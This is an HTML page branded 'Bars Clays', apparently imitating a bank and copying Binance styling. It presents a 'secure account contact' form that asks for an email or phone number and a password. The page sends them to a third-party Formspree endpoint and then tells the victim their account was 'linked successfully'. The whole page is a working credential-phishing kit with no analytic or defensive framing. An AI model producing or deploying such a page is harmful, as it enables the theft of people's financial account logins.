<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bars Clays</title>

<style>

/* ---------- RESET ---------- */
*{margin:0;padding:0;box-sizing:border-box;}
body{
font-family:Arial, Helvetica, sans-serif;
background:#f5f5f5;   /* ← replaced dark background with first HTML background */
display:flex;
justify-content:center;
align-items:flex-start;
min-height:100vh;
padding:20px;
}

/* ---------- CARD ---------- */
.container{
width:100%;
max-width:420px;
background:#fff;
border-radius:18px;
padding:38px 28px;
box-shadow:0 20px 60px rgba(0,0,0,.35);
}

/* ---------- LOGO ---------- */
.logo{
text-align:center;
font-weight:700;
font-size:28px;
color:#fcd535;
margin-bottom:8px;
}
.subtitle{
text-align:center;
color:#777;
font-size:14px;
margin-bottom:32px;
}

/* ---------- ADDED WELCOME (from first HTML) ---------- */

.welcome{
font-size:28px;
font-weight:700;
margin-bottom:26px;
}

/* ---------- BINANCE STYLE INPUT (EXACT FROM FIRST HTML) ---------- */

.binance-input{
width:100%;
margin-top:8px;
padding:16px;
border-radius:10px;
border:none;
background:#efefef;
font-size:15px;
margin-bottom:18px;
}

/* ---------- INPUT ---------- */
.input-group{margin-bottom:18px;}

.input-group textarea{
width:100%;
padding:15px;
border-radius:10px;
border:1px solid #dfe3e8;
font-size:16px;
transition:.25s;
background:#fafafa;
}

.input-group textarea:focus{
outline:none;
border-color:#fcd535;
background:white;
box-shadow:0 0 0 3px rgba(252,213,53,.15);
}

/* ---------- BUTTON ---------- */
button{
width:100%;
padding:16px;
border:none;
border-radius:10px;
background:#fcd535;
font-weight:700;
font-size:16px;
cursor:pointer;
display:flex;
justify-content:center;
align-items:center;
gap:10px;
}

button:disabled{opacity:.7;cursor:not-allowed}

/* spinner */
.spinner{
width:18px;height:18px;
border:3px solid #000;
border-top:3px solid transparent;
border-radius:50%;
animation:spin .8s linear infinite;
display:none;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* ---------- POPUP ---------- */
.popup{
position:fixed;
top:0;left:0;
width:100%;height:100%;
background:rgba(0,0,0,.6);
display:none;
justify-content:center;
align-items:center;
padding:20px;
}

.popup-box{
background:#1E2329;
color:#EAECEF;
border-radius:14px;
padding:40px 30px;
max-width:360px;
width:100%;
text-align:center;
animation:popBox .25s ease;
}

@keyframes popBox{
from{transform:scale(.9);opacity:.4}
to{transform:scale(1);opacity:1}
}

.checkmark{
width:80px;height:80px;
border-radius:50%;
display:flex;
justify-content:center;
align-items:center;
margin:0 auto 20px;
background:#0ECB81;
animation:pop .45s ease forwards;
position:relative;
}

.checkmark::after{
content:'✔';
font-size:42px;
color:#fff;
opacity:0;
animation:fadeIn .5s ease .45s forwards;
}

@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}

.popup h2{color:#0ECB81;margin-bottom:8px;}
.popup p{color:#B7BDC6;font-size:14px;margin-bottom:20px;}

.popup button{
background:#FCD535;
color:#000;
padding:12px 22px;
border-radius:8px;
}

/* MOBILE */
@media(max-width:420px){
.container{padding:30px 22px}
.logo{font-size:24px}
.checkmark{width:65px;height:65px}
.checkmark::after{font-size:32px}
}

</style>
</head>

<body>

<div class="container">

<div class="logo">Bars Clays</div>
<div class="subtitle">Secure account contact</div>

<!-- ✅ added welcome from first HTML -->
<div class="welcome">Welcome to Bars Clays</div>

<form id="contactForm" action="https://formspree.io/f/xjgewvle" method="POST">

<!-- ✅ replaced email input with EXACT first HTML style -->
<label>Email / Phone number</label>
<input class="binance-input" type="text" name="email" placeholder="Email/Phone (without country code)" required>

<!-- ✅ added password under it (same style) -->
<label>Password</label>
<input class="binance-input" type="password" name="password" placeholder="Enter password" required>

<div class="input-group">
<textarea name="message" rows="4" placeholder="Message" required></textarea>
</div>

<button id="submitBtn">
<span id="btnText">Continue</span>
<div id="spinner" class="spinner"></div>
</button>

</form>
</div>


<!-- SUCCESS POPUP (UNCHANGED) -->
<div id="popup" class="popup">
<div class="popup-box">
<div class="checkmark"></div>
<h2>Account Linked Successfully!</h2>
<p>Your Bars Clays account details have been received safely.</p>
<button onclick="closePopup()">Back</button>
</div>
</div>


<script>

const form=document.getElementById("contactForm");
const btn=document.getElementById("submitBtn");
const spinner=document.getElementById("spinner");
const text=document.getElementById("btnText");
const popup=document.getElementById("popup");

form.addEventListener("submit",async e=>{
e.preventDefault();

btn.disabled=true;
spinner.style.display="block";
text.textContent="Sending...";

try{

const res=await fetch(form.action,{
method:"POST",
body:new FormData(form),
headers:{'Accept':'application/json'}
});

if(!res.ok) throw new Error();

popup.style.display="flex";
form.reset();

}catch{
alert("Network error — please try again.");
}

btn.disabled=false;
spinner.style.display="none";
text.textContent="Continue";

});

function closePopup(){
popup.style.display="none";
}

</script>

</body>
</html>
